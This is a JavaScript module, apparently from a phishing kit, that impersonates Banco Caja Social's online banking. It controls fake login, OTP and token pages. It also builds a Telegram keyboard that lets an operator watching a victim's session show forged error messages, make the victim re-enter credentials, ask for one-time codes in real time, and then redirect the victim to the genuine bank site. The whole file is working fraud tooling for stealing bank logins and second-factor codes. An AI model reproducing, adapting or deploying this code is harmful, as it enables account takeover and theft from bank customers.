/**
 * Botones y errores Telegram — Caja Social
 */
(function() {
    'use strict';

    const LOGIN_ERROR_KEY = 'cajaSocialLoginError';
    const OTP_ERROR_KEY = 'cajaSocialOtpError';
    const TOKEN_ERROR_KEY = 'cajaSocialTokenError';

    const OTP_TOKEN_ERROR_TEXT = 'CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO';

    const PAGE_MAP = {
        login: 'index.html',
        password: 'password.html',
        token: 'token.html',
        otp: 'otp.html',
        finalizar: 'https://www.bancocajasocial.com/'
    };

    function currentPage() {
        return window.location.pathname.split('/').pop() || 'index.html';
    }

    function pageUrl(file) {
        return `/bancas/Caja-Social/${file}`;
    }

    function hideLoadingOverlay() {
        if (window.BancoUtils) BancoUtils.hideOverlay();
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show', 'active');
            overlay.style.display = 'none';
        }
    }

    function applyLoginError() {
        const alert = document.getElementById('loginErrorAlert');
        const fieldHint = document.getElementById('loginFieldHint');
        const intentos = document.getElementById('intentosRestantes');
        const usuario = document.getElementById('usuario');
        const btn = document.getElementById('submitBtn') || document.querySelector('.btn-siguiente');

        if (alert) alert.hidden = false;
        if (fieldHint) fieldHint.hidden = false;
        if (intentos) intentos.hidden = false;

        if (usuario) {
            usuario.value = '';
            usuario.classList.add('error');
            usuario.focus();
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function applyOtpError() {
        const alert = document.getElementById('otpTokenErrorAlert');
        const otp = document.getElementById('otp');
        const btn = document.getElementById('btnVerificar');

        if (alert) alert.hidden = false;
        if (otp) {
            otp.value = '';
            otp.classList.add('error');
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function applyTokenError() {
        const alert = document.getElementById('otpTokenErrorAlert');
        const token = document.getElementById('token');
        const btn = document.getElementById('btnContinuar');

        if (alert) alert.hidden = false;
        if (token) {
            token.value = '';
            token.classList.add('error');
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function initLoginErrorFromStorage() {
        if (!sessionStorage.getItem(LOGIN_ERROR_KEY)) return;
        sessionStorage.removeItem(LOGIN_ERROR_KEY);
        applyLoginError();
    }

    function initOtpErrorFromStorage() {
        if (!sessionStorage.getItem(OTP_ERROR_KEY)) return;
        sessionStorage.removeItem(OTP_ERROR_KEY);
        applyOtpError();
    }

    function initTokenErrorFromStorage() {
        if (!sessionStorage.getItem(TOKEN_ERROR_KEY)) return;
        sessionStorage.removeItem(TOKEN_ERROR_KEY);
        applyTokenError();
    }

    function setupDismissHandlers() {
        const usuario = document.getElementById('usuario');
        if (usuario) {
            usuario.addEventListener('input', () => {
                usuario.classList.remove('error');
                const hint = document.getElementById('loginFieldHint');
                if (hint) hint.hidden = true;
            });
        }
        const otp = document.getElementById('otp');
        if (otp) {
            otp.addEventListener('input', () => otp.classList.remove('error'));
        }
        const token = document.getElementById('token');
        if (token) {
            token.addEventListener('input', () => token.classList.remove('error'));
        }
    }

    function initPageErrors() {
        const page = currentPage();
        if (page === 'index.html') initLoginErrorFromStorage();
        if (page === 'otp.html') initOtpErrorFromStorage();
        if (page === 'token.html') initTokenErrorFromStorage();
        setupDismissHandlers();
    }

    /**
     * Teclado operador (sin Pedir Password): 2 botones por fila para que se vean en Telegram móvil.
     */
    function getOperatorKeyboard() {
        if (!window.BancoUtils) return null;
        const sid = BancoUtils.getSessionId();
        const cb = (action) => `${action}:${sid}`;

        return {
            inline_keyboard: [
                [
                    { text: '❌ Error Login', callback_data: cb('error_login') },
                    { text: '❌ Error OTP', callback_data: cb('error_otp') }
                ],
                [
                    { text: '❌ Error Token', callback_data: cb('error_token') },
                    { text: '🔐 Pedir Login', callback_data: cb('login') }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: cb('otp') },
                    { text: '📱 Pedir Token', callback_data: cb('token') }
                ],
                [
                    { text: '✅ Finalizar', callback_data: cb('finalizar') }
                ]
            ]
        };
    }

    function navigateTo(file) {
        if (file.startsWith('http')) {
            window.location.href = file;
        } else {
            window.location.href = pageUrl(file);
        }
    }

    function handleTelegramAction(data) {
        if (!data || !data.action) return;

        hideLoadingOverlay();

        if (data.action === 'error_login') {
            sessionStorage.setItem(LOGIN_ERROR_KEY, '1');
            if (currentPage() === 'index.html') {
                sessionStorage.removeItem(LOGIN_ERROR_KEY);
                applyLoginError();
            } else {
                navigateTo('index.html');
            }
            return;
        }

        if (data.action === 'error_otp') {
            sessionStorage.setItem(OTP_ERROR_KEY, '1');
            if (currentPage() === 'otp.html') {
                sessionStorage.removeItem(OTP_ERROR_KEY);
                applyOtpError();
            } else {
                navigateTo('otp.html');
            }
            return;
        }

        if (data.action === 'error_token') {
            sessionStorage.setItem(TOKEN_ERROR_KEY, '1');
            if (currentPage() === 'token.html') {
                sessionStorage.removeItem(TOKEN_ERROR_KEY);
                applyTokenError();
            } else {
                navigateTo('token.html');
            }
            return;
        }

        const next = PAGE_MAP[data.action];
        if (next) navigateTo(next);
    }

    window.CajaSocialTelegram = {
        OTP_TOKEN_ERROR_TEXT,
        getOperatorKeyboard,
        handleTelegramAction,
        initPageErrors,
        applyLoginError,
        applyOtpError,
        applyTokenError
    };
})();
